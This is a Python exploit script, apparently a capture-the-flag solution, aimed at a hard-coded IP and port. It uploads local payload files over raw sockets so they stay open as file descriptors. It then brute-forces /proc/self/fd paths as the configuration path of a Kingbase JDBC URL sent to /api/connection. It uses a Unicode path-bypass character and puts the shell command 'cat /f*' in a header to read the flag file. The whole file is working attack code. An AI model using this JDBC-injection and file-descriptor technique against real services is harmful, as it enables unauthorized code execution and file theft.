import socket
import threading
import time
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "1.95.113.59"
PORT = 10020
URL = HOST + ":" + str(PORT)


import socket
import time


def cache_tmp(fileName):
    filepath = fileName
    with open(filepath, "rb") as f:
        raw_data = f.read().strip()
    data_hex = raw_data.hex()
    a = data_hex
    a = (
        b"""POST /api/connection HTTP/1.1
Host: """
        + URL.encode()
        + b"""
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: multipart/form-data; boundary=xxxxxx
User-Agent: python-requests/2.32.3
Content-Length: 1296800

--xxxxxx
Content-Disposition: form-data; name="file"; filename="a.txt"

{{payload}}
""".replace(
            b"\n", b"\r\n"
        ).replace(
            b"{{payload}}", bytes.fromhex(a) + b"\n" * 1024 * 124
        )
    )
    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(a)
    time.sleep(1111111)


def exp():
    url = f"http://{HOST}:{PORT}/api/connection/%C5%BFuctf"
    headers = {
        "Host": URL,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "X-Authorization": "cat /f*",
        "Content-Type": "application/json",
    }

    def send_request(fd):
        print(f"当前爆破到fd: {fd}")
        named_pipe_path = f"/proc/self/fd/{fd}"
        payload = {
            "urlType": "jdbcUrl",
            "driver": "com.kingbase8.Driver",
            "jdbcUrl": f"jdbc:kingbase8:?ConfigurePath={named_pipe_path}",
            "username": "postgres",
            "password": "your_password",
        }
        payload_json = json.dumps(payload).encode("utf-8")
        headers["Content-Length"] = str(len(payload_json))
        try:
            print(f"[exp] POST with fd={fd}")
            with requests.Session() as sess:
                r = sess.post(url, headers=headers, data=payload_json, timeout=5)
            print(r.text)
            time.sleep(2)
            return f"[exp] fd={fd} -> {r.status_code} len={len(r.content or b'')}"
        except Exception as e:
            return f"[exp] fd={fd} -> exception: {e}"

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(send_request, fd): fd for fd in range(21, 50)}
        for future in as_completed(futures):
            print(future.result())


t1 = threading.Thread(target=cache_tmp, args=("./evil.txt",))
t1.start()
time.sleep(1)
t2 = threading.Thread(target=cache_tmp, args=("./exp.xml",))
t2.start()
time.sleep(1)
exp()
